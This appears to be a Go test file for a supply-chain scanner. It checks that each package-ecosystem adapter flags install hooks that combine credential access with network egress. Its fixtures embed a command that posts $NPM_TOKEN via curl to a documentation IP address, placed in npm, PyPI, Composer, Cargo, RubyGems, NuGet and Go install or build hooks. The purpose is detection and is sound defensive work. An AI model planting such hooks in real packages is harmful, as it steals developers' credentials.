package conformance_test

import (
	"strings"
	"testing"

	"ihbv.io/depsnort/internal/ecosystem/cargo"
	"ihbv.io/depsnort/internal/ecosystem/composer"
	"ihbv.io/depsnort/internal/ecosystem/gomod"
	"ihbv.io/depsnort/internal/ecosystem/npm"
	"ihbv.io/depsnort/internal/ecosystem/nuget"
	"ihbv.io/depsnort/internal/ecosystem/pypi"
	"ihbv.io/depsnort/internal/ecosystem/rubygems"
	"ihbv.io/depsnort/internal/graph"
)

// Exfil-edge conformance: the same SHARED-HELPER-COPY contract as the republish
// suite, for graph.EdgeExfil.
//
// graph.EdgeExfil ("artifact/sink -> C2") was defined, counted in the
// install-time subgraph, and rendered by the emitters, but — exactly like
// EdgeRepublish before D-152 — no detector ever drew one. An install hook that
// combines named-credential access with network egress is VC-002d's
// exfil-capable signature; the edge links each credential sink to each remote
// destination the hook can reach, so an operator sees the leak in the graph, not
// only in the finding. It is drawn in instsurf.AddToGraph and in the three
// hand-rolled copies (npm, PyPI, Composer); this suite fails if any adapter
// stops drawing it.
//
// Every fixture is an inert hook that curls a TEST-NET-2 host with a credential
// in the header. IOCs are RFC 5737 throughout; nothing here is ever executed.

// The exfil payload: network egress (curl) + a named credential (NPM_TOKEN) + a
// concrete remote destination (the C2 node the edge points at). Kept identical
// across ecosystems so a failure means the adapter differs, not the fixture.
// Deliberately quote-free so it embeds cleanly in a JSON package manifest, and
// the credential is a SEPARATE argument from the URL — a token buried in the URL
// query is stripped along with the URL by the PyPI metadata-URL scrubber, which
// would drop the credential capability before it is seen.
const exfilPayload = `curl https://198.51.100.7/collect -d $NPM_TOKEN`

func exfilCases() []republishCase {
	return []republishCase{
		{
			name: "npm", adapter: npm.New(), ecosystem: "npm",
			id: "pkg:npm/leaky@1.0.0",
			files: map[string]string{
				"package.json": `{"name":"leaky","version":"1.0.0","scripts":{"postinstall":"` + exfilPayload + `"}}`,
			},
		},
		{
			name: "pypi", adapter: pypi.New(), ecosystem: "pypi",
			id: "pkg:pypi/leaky@1.0.0",
			files: map[string]string{
				"setup.py": "from setuptools import setup\nimport subprocess\n" +
					"subprocess.check_call('" + exfilPayload + "', shell=True)\n" +
					"setup(name='leaky', version='1.0.0')\n",
			},
		},
		{
			name: "composer", adapter: composer.New(), ecosystem: "composer",
			id: "pkg:composer/vendor/leaky@1.0.0",
			files: map[string]string{
				"composer.json": `{"name":"vendor/leaky","version":"1.0.0",` +
					`"scripts":{"post-install-cmd":["` + exfilPayload + `"]}}`,
			},
		},
		{
			name: "cargo", adapter: cargo.New(), ecosystem: "cargo",
			id: "pkg:cargo/leaky@1.0.0",
			files: map[string]string{
				"Cargo.toml": "[package]\nname = \"leaky\"\nversion = \"1.0.0\"\nedition = \"2021\"\nbuild = \"build.rs\"\n",
				"build.rs": "fn main() {\n    std::process::Command::new(\"sh\").arg(\"-c\")\n" +
					"        .arg(\"" + exfilPayload + "\").status().unwrap();\n}\n",
			},
		},
		{
			// A gemspec BODY payload (no extensions declaration), so it routes
			// through the gemspec:body branch that materializes sinks and remote
			// artifacts — the exfil edge needs a credential sink and a C2 node.
			// The gemspec:extensions branch is deliberately caps-only (D-150) and
			// so cannot originate an exfil edge.
			name: "rubygems", adapter: rubygems.New(), ecosystem: "gem",
			id: "pkg:gem/leaky@1.0.0",
			files: map[string]string{
				"leaky.gemspec": "Gem::Specification.new do |s|\n  s.name = \"leaky\"\n" +
					"  system(\"" + exfilPayload + "\")\nend\n",
			},
		},
		{
			name: "nuget", adapter: nuget.New(), ecosystem: "nuget",
			id: "pkg:nuget/leaky@1.0.0",
			files: map[string]string{
				"build/leaky.targets": "<Project><Target Name=\"Go\" AfterTargets=\"Build\">\n" +
					"<Exec Command=\"" + exfilPayload + "\" />\n</Target></Project>",
			},
		},
		{
			name: "gomod", adapter: gomod.New(), ecosystem: "gomod",
			id: "pkg:gomod/example.com/leaky@v1.0.0",
			files: map[string]string{
				"go.mod": "module example.com/leaky\n\ngo 1.21\n",
				"gen.go": "package leaky\n\n//go:generate sh -c \"" + exfilPayload + "\"\n",
			},
		},
	}
}

// TestExfilEdgeIsDrawnByEveryAdapter is the contract itself.
func TestExfilEdgeIsDrawnByEveryAdapter(t *testing.T) {
	for _, c := range exfilCases() {
		t.Run(c.name, func(t *testing.T) {
			dir := writeTree(t, c.files)
			g := graph.New()
			g.AddNode(&graph.Node{
				ID: c.id, Kind: graph.KindPackage, Ecosystem: c.ecosystem,
				Name: "leaky", Version: "1.0.0", Depth: 0,
			})
			g.MarkRoot(c.id)
			if err := c.adapter.ExtractInstallSurface(dir, g); err != nil {
				t.Logf("ExtractInstallSurface reported gaps: %v", err)
			}

			// Precondition: the hook has to have been found AND classified
			// exfil-capable, or "no exfil edge" would be a fixture bug reported as
			// a contract violation.
			var hooks []string
			for _, n := range g.SortedNodes() {
				if n.Kind == graph.KindInstallHook {
					hooks = append(hooks, n.Name)
					if n.Attr["cap.credentials"] != "true" || n.Attr["cap.network"] != "true" {
						t.Fatalf("fixture hook %q is not exfil-capable (caps: cred=%q net=%q); "+
							"the exfil assertion would be vacuous",
							n.Name, n.Attr["cap.credentials"], n.Attr["cap.network"])
					}
				}
			}
			if len(hooks) == 0 {
				t.Fatalf("fixture produced no install hook; the exfil assertion would be vacuous")
			}

			for _, e := range g.Edges {
				if e.Type == graph.EdgeExfil {
					if !strings.HasPrefix(e.From, "sink:") {
						t.Errorf("exfil edge must originate at a credential sink, got From=%q", e.From)
					}
					if !strings.HasPrefix(e.To, "artifact:") {
						t.Errorf("exfil edge must point at a remote artifact (the C2), got To=%q", e.To)
					}
					return
				}
			}
			t.Errorf("hook(s) %v are exfil-capable (credentials + network egress) but no %s edge was drawn;\n"+
				"this is the D-152 shape: a hand-rolled copy of instsurf.AddToGraph that has drifted from it",
				hooks, graph.EdgeExfil)
		})
	}
}

// TestExfilNoEdgeWithoutBothCaps is the boundary: network egress alone, with no
// credential access, must draw no exfil edge.
func TestExfilNoEdgeWithoutBothCaps(t *testing.T) {
	dir := writeTree(t, map[string]string{
		"package.json": `{"name":"fetchonly","version":"1.0.0","scripts":{"postinstall":"curl https://198.51.100.7/x"}}`,
	})
	g := graph.New()
	g.AddNode(&graph.Node{
		ID: "pkg:npm/fetchonly@1.0.0", Kind: graph.KindPackage, Ecosystem: "npm",
		Name: "fetchonly", Version: "1.0.0", Depth: 0,
	})
	g.MarkRoot("pkg:npm/fetchonly@1.0.0")
	if err := npm.New().ExtractInstallSurface(dir, g); err != nil {
		t.Logf("ExtractInstallSurface reported gaps: %v", err)
	}
	for _, e := range g.Edges {
		if e.Type == graph.EdgeExfil {
			t.Errorf("a network-only hook (no credential access) must draw no exfil edge: %+v", e)
		}
	}
}

// TestExfilConformanceCoversEveryHookAdapter mirrors the republish coverage
// guard: an adapter added to the suite but not to exfilCases() is caught here.
func TestExfilConformanceCoversEveryHookAdapter(t *testing.T) {
	want := []string{"npm", "pypi", "composer", "cargo", "rubygems", "nuget", "gomod"}
	have := map[string]bool{}
	for _, c := range exfilCases() {
		have[c.name] = true
	}
	for _, w := range want {
		if !have[w] {
			t.Errorf("adapter %q builds install hooks but has no exfil conformance case", w)
		}
	}
	if len(have) != len(want) {
		t.Errorf("exfilCases() has %d cases for %d hook adapters", len(have), len(want))
	}
}
